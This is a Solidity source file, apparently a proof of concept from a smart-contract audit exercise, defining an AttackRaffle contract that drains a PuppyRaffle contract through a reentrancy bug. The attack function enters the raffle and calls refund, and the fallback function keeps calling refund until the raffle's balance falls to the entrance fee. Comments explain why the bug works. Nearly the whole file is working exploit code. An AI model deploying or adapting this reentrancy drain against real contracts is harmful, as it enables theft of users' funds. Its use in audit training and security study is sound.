// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract AttackRaffle {
    PuppyRaffle public puppyRaffle;

    //the array that will consist from 1 address(address(this)) that is sent as an argument to the enterRaffle function to enter the Raffle

    address[] public entrants;

    uint256 public entranceFee;

    // adding some ether to pay the entrace fee and to cover gas costs for interacting with the PuppyRaffle
    
    uint public balance;

    // adding address of this contract to the entrants[] and sending some ether to pay the entranceFee
    constructor(PuppyRaffle _puppyRaffle, uint256 _entranceFee) payable {
        puppyRaffle = _puppyRaffle;
        entrants.push(address(this));
        entranceFee = _entranceFee;
        balance = msg.value; // should be more than entranceFee to cover gas costs when will be calling the refund function
        
    }

    // calling puppyRaffle sending entrants array from 1 member address(this), and the entranceFee.

    function attack() public payable {
        require(msg.value > 0);
        puppyRaffle.enterRaffle{value: entranceFee}(entrants);
        uint256 index = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(index);
    }

    // At first we get the index of the address to send it as an input data to the refund function. When the refund function will send the refund to this adddress the fallback function will be called and a loop of refund calls created, since the address of the contract removed from players array only after sending the entranceFee back. The loop stops when puppyRaffle balance is less (or equal) than the entranceFee.

    fallback() external payable {
        if (address(puppyRaffle).balance > entranceFee) {
            uint256 index = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(index);
        }
    }
}

